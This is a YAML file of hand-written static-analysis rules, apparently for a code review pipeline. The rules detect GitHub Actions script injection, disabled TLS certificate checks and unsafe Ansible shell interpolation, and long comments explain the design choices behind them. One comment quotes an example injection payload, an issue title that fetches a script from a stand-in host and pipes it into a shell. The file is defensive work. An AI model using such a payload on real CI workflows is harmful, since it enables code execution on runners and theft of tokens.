# Curated offline rules for the YAML this fleet is actually made of: CI
# workflows and Ansible (#859).
#
# WHY THIS FILE EXISTS. Until 2026-08-15 the entire vendored ruleset was ten
# Python rules. The engine ran correctly and found nothing outside Python,
# because there was nothing to find with - so a repo of Ansible, k8s manifests
# and CI workflows had a SAST capability on paper and zero coverage in fact.
# Every runner test passed the whole time; the eval scored security-scope 0.00
# and that was read as a model problem.
#
# Same conventions as python.yml: vendored so the review path needs NO network,
# `metadata.vuln_class` on every rule (the runner DROPS findings without one),
# high-signal over exhaustive - the LLM exploitability judge prunes the rest.
#
# NOT DUPLICATING iac_scan.py. That module already regexes `privileged`,
# `hostNetwork/PID/IPC`, `allowPrivilegeEscalation`, `runAsNonRoot: false` and
# more, emitting the SAME iac-misconfig class - and guard/dispatch.py
# concatenates `scan_candidates(...) + scan_iac(...)` with no dedup, so a rule
# here that repeats one there double-reports on every PR. The first draft of
# this file added three k8s rules that did exactly that; they are removed.
# Check iac_scan.py's _RULES before adding anything IaC-shaped here.
#
# DIRECTION CHOSEN (#859 asks for this to be recorded, not just done).
# #859 offered three: (1) adopt a free redistributable rule pack, (2) add a
# purpose-built IaC scanner, (3) write fleet-specific rules for the bugs this
# fleet actually gets bitten by. This file is (3) for the SECURITY classes and
# deliberately NOT (3) for the reliability ones, for a reason worth stating:
#
#   sast.py sets `_SAST_SEVERITY = "high"` for EVERY finding this ruleset
#   produces, whatever a rule's own `severity:` says. A rule set that cannot
#   express its own severity is a blunt instrument; tracked separately.
#
#   CORRECTION (2026-08-15). An earlier version of this paragraph said a
#   finding here "can never be refuted" because judge.py's
#   `_SUPPRESSIBLE_SEVERITIES` is {"low","medium"}, and concluded that
#   anything added here publishes unconditionally. That was wrong, and it
#   cited the wrong judge. `_SUPPRESSIBLE_SEVERITIES` (judge.py:54, read at
#   judge.py:314) is ELDER's plausibility gate, and this ruleset never
#   reaches Elder: `scan_opengrep` is called only from Guard
#   (personas/guard/dispatch.py), which runs its OWN suppressor -
#   `sast.judge_candidates`, the exploitability judge. That judge is
#   severity-AGNOSTIC, drops any candidate judged unexploitable, and is
#   FAIL-CLOSED on its own outage (candidates suppressed, not posted raw).
#   Guard is also advisory by default (`guard_blocking` defaults False).
#   So findings here are suppressible, on a different axis, by a different
#   persona, onto a non-blocking check-run.
#
# This file is still (3) for the SECURITY classes and still deliberately NOT
# (3) for the reliability ones - but for the OPPOSITE reason to the one
# originally written here. The reliability patterns #859 lists as option-3
# candidates - swallowed `2>/dev/null`, `|| true` on a verification step, an
# exit code read through a pipe - are not exploitable in any source-to-sink
# sense. Routed here they would meet an EXPLOITABILITY judge, be judged
# not-exploitable, and be dropped. The risk was never that they would flood
# every PR as unsuppressible noise; it is that they would vanish silently,
# which is worse and much harder to notice. They belong in the lint evidence
# layer (lint.py) or a class the judge can actually weigh.
#
# Options (1) and (2) were not taken: no pack is vendored and no new scanner is
# added, so there is no third-party rule licence to record - every rule below is
# hand-authored in this repo, as original work under the repo's own licence
# (GNU AGPL v3 - see LICENSE at the repo root). If a pack is ever adopted,
# its licence must be checked against the free/open-source-only constraint
# first.
#
# NOTE ON `severity:` BELOW. It is currently decorative - sast.py overrides it.
# It is set honestly anyway so the intent survives if that ever changes.
rules:
  # --- CI workflows ------------------------------------------------------
  #
  # Script injection is the highest-severity thing that can go wrong in a
  # workflow file and it looks completely ordinary. `${{ github.event.* }}` is
  # substituted into the shell BEFORE the shell runs, so an issue titled
  # `"; curl evil.sh | sh; #` executes on the runner with its token. The safe
  # form is to pass the value through `env:` and reference "$VAR", which quotes
  # it as data.
  - id: grug-gha-run-untrusted-interpolation
    languages: [yaml]
    severity: ERROR
    message: >-
      GitHub Actions script injection: attacker-controllable ${{ github.event.* }}
      (or head_ref) is interpolated directly into a run: block. The value is
      substituted before the shell parses the line, so a crafted title, branch
      name or comment body executes as code on the runner. Pass it through env:
      and reference the variable in double quotes instead.
    metadata: {vuln_class: command-injection}
    patterns:
      # The `(?:-[ \t]+)?` is load-bearing: a step is a YAML list item, so the
      # line reads `- run: ...` and an `^\s*run:` anchor matches nothing. The
      # first draft of this rule was well-formed, passed every structural
      # test, and caught zero of its own planted vulnerabilities.
      - pattern-regex: >-
          (?m)^[ \t]*(?:-[ \t]+)?run:.*\$\{\{[^}]*(?:github\.(?:event\.[A-Za-z_.\[\]'"-]+|head_ref)|inputs\.[A-Za-z_][A-Za-z0-9_-]*)[^}]*\}\}

  # The same substitution inside a block scalar. Separate rule rather than one
  # clever regex: `run: |` puts the dangerous line anywhere in the following
  # block, and a single pattern trying to span both shapes matched neither
  # reliably when tested against the engine.
  - id: grug-gha-run-block-untrusted-interpolation
    languages: [yaml]
    severity: ERROR
    message: >-
      GitHub Actions script injection inside a multi-line run: block -
      attacker-controllable ${{ github.event.* }} (or head_ref) is substituted
      into the script before the shell parses it. Pass it through env: and
      reference the variable in double quotes.
    metadata: {vuln_class: command-injection}
    patterns:
      - pattern-regex: >-
          (?ms)^[ \t]*(?:-[ \t]+)?run:[ \t]*[|>][^\n]*\n(?:[ \t]+[^\n]*\n){0,400}?[ \t]+[^\n]*\$\{\{[^}]*(?:github\.(?:event\.[A-Za-z_.\[\]'"-]+|head_ref)|inputs\.[A-Za-z_][A-Za-z0-9_-]*)[^}]*\}\}

  # --- Ansible ------------------------------------------------------------
  #
  # Named explicitly in #859's acceptance criteria and initially missed here -
  # the first draft's own header said "CI workflows and Kubernetes manifests"
  # and quietly dropped it.
  - id: grug-ansible-tls-verification-disabled
    languages: [yaml]
    severity: ERROR
    message: >-
      TLS certificate verification is disabled (validate_certs/verify off). The
      connection is then trivially machine-in-the-middle'able, and this is
      usually pasted in to get past a self-signed cert and never removed. Trust
      the CA properly instead.
    metadata: {vuln_class: iac-misconfig}
    patterns:
      - pattern-regex: '(?mi)^\s*(?:-\s+)?validate_certs:\s*(?:no|false)\s*$'

  - id: grug-ansible-shell-interpolates-variable
    languages: [yaml]
    severity: ERROR
    message: >-
      Ansible shell/command interpolates a Jinja variable straight into the
      command line. If that value is attacker-influenced (inventory, a fact, a
      lookup, an extra-var) it is command injection. Prefer the `command`
      module with an argv list, or quote the value explicitly.
    metadata: {vuln_class: command-injection}
    patterns:
      - pattern-regex: '(?m)^\s*(?:-\s+)?(?:ansible\.builtin\.)?shell:\s*.*\{\{.*\}\}'
